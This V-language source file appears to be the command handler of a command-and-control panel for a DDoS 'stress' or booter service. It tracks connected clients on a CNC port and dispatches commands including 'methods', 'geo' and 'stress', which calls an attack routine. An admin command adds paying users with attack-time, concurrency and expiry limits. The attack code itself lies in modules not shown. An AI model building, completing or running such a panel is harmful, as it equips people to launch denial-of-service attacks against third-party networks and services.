module server

import net
import banner_sys
import wocky_uix
import config 
import auth


//cmds
import commands


// #include "@VROOT/c_headers/testfd.c"

// fn C.r_keys(int) string

pub struct ServerAssets {
	pub mut:
		empty_c int
		cnc_port string
		clients []net.TcpConn

}

pub struct Test{
	pub mut:
		lul []ServerAssets
}

pub fn cmd_handler(mut socket net.TcpConn, data string, username string) {
	mut b := banner_sys.Banner{file: "ui"}
	if data.len == 0 {
		socket.write_string(config.Clear) or { 0 }
		b.start_output(mut socket)
		b.set_bannerfile("text")
		b.read_banner_text(mut socket)
	} else {
		if data == "" { return }
		/*
		Struct Declaring
		*/
		mut c := config.Config{}
		mut wuix := wocky_uix.UIX_Func{}

		// Command Parsing
		if data.contains(" ") {
			c.set_config_info((data.split(" ")[0]), data, (data.split(" ")), ((data.split(" ")).len))
		} else { c.set_config_info(data, data, [data], data.len) }
		
		// Command Handling
		match c.cmd {
			"home" {
				socket.write_string(config.Clear) or { 0 }
				b.start_output(mut socket)
				b.set_bannerfile("text")
				b.read_banner_text(mut socket)
			}
			"help" {	
				// b.set_bannerfile('help')
				socket.write_string(b.color_banner()) or { 0 }
			}
			"clear" {
				// b.set_bannerfile('main')
				socket.write_string(config.Clear + b.color_banner()) or { 0 }
			} 
			"whoami" {
				socket.write_string("${username}\r\n") or { 0 }
			}
			"info" {
				mut cf := auth.CrudFunc{user: username}
				socket.write_string(cf.myinfo()) or { 0 }
			}
			"changepw" {
				commands.changepw_cmd(mut socket, data, username)
			}
			"methods" {	
				b.set_bannerfile("methods")
				socket.write_string(b.color_banner()) or { 0 }
			}
			"geo" {
				commands.geo_cmd(mut socket, data)
			} 
			"stress" {
				commands.attack_cmd(mut socket, data.split(" "),  username)
			}
			"admin" {
				admin_handler(mut socket, data, username)
			} else {
				socket.write_string("[x] Error, No command found") or { 0 }
			}
		}

		wuix.sock_move_cursor(mut socket, 19, 37)
		println(data) // send this to the new logger when finished
	}
}

pub fn admin_handler(mut socket net.TcpConn, data string, username string) {
	mut arg := data.split(" ")
	mut cmd := arg[0]
	mut admin_cmd := arg[1]

	match admin_cmd {
		"userlist" {
			commands.admin_userlist_cmd(mut socket, data, username)
		}
		"add" {
			mut p := auth.Crud{user: arg[2], pw: arg[3], lvl: arg[4].int(), mtime: arg[5].int(), conn: arg[6].int(), admin: arg[7].int(), expiry: arg[8]}
			socket.write_string(p.add_user()) or { 0 }
		} else { 
			socket.write_string("[x] Error, No admin command found!\r\n") or { 0 }
		}
	}
	println('test')
}